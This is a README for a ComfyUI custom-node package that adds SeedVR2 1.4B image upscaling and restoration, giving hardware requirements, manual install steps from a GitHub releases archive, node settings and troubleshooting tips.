# 🖼️ ComfyUI-FL-SeedVR2 - Improve image quality using SeedVR2 tools

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases)

ComfyUI-FL-SeedVR2 adds image restoration and upscaling capabilities to your ComfyUI workspace. This collection of nodes gives you access to the SeedVR2 1.4B model. You can sharpen low-resolution images, remove noise, and improve visual detail through custom nodes designed for your existing ComfyUI installation.

## 🛠️ System Requirements

Before you install these nodes, ensure your computer meets the following hardware needs for smooth image processing:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 16GB of system RAM.
*   **Graphics Card:** A dedicated NVIDIA GPU with at least 8GB of VRAM is necessary to run the 1.4B model.
*   **Disk Space:** 5GB of free space.
*   **Compatibility:** A working installation of ComfyUI must exist on your computer.

## 📥 How to Install

Follow these steps to add the SeedVR2 nodes to your ComfyUI environment.

1. Visit the [releases page](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases) to access the current files.
2. Download the latest version of the repository archive.
3. Open your ComfyUI installation folder.
4. Navigate into the `ComfyUI/custom_nodes/` directory.
5. Create a new folder named `ComfyUI-FL-SeedVR2`.
6. Extract the contents of your downloaded archive into this new folder.
7. Restart your ComfyUI application.

## 🚀 Setting Up the Nodes

Once you restart ComfyUI, the system loads the new nodes automatically. You can verify the installation by right-clicking in your node area, selecting "Add Node," and searching for "SeedVR2." If you see the options, the installation succeeded.

To use the tools, add the main SeedVR2 node to your active workflow. Connect your source image input to the node input. Make sure to select the correct model version from the dropdown menu within the node settings. The 1.4B model requires a brief loading time when you execute your first generation.

## ⚙️ Configuration Details

The SeedVR2 nodes provide several sliders to manage image restoration. Understanding these settings helps you achieve better results.

*   **Upscale Factor:** This defines how much the system increases the pixel count. Values between 2 and 4 work best for textures.
*   **Denoising Strength:** This slider controls the amount of detail added back to the image. A low value maintains the original structure, while a high value creates more aggressive sharpening.
*   **Model Precision:** Use FP16 for faster processing and lower memory usage. Use FP32 if you experience errors or artifacts.

## 💡 Troubleshooting Common Issues

If you encounter errors, check these common points of failure:

*   **Missing Models:** Ensure the SeedVR2 model data exists in your models folder. ComfyUI usually attempts to download the required weights on the first run. Check the terminal window for download progress.
*   **Out of Memory Errors:** If your GPU reports an "Out of Memory" error, close other applications that use your graphics card. You may also need to lower the upscale factor or process smaller images.
*   **Node Not Found:** If the node does not display, check that you extracted the files into the `custom_nodes` folder and not a subfolder. The `__init__.py` file must be located inside `ComfyUI/custom_nodes/ComfyUI-FL-SeedVR2/`.

## 📦 Updating the Software

To update to a newer version, repeat the download process from the release page. Replace the existing files in your `ComfyUI/custom_nodes/ComfyUI-FL-SeedVR2/` folder with the new versions provided in the latest release archive. Always restart your application after updating.

Keywords: comfyui, comfyui-custom-node, image-upscaling, seedvr2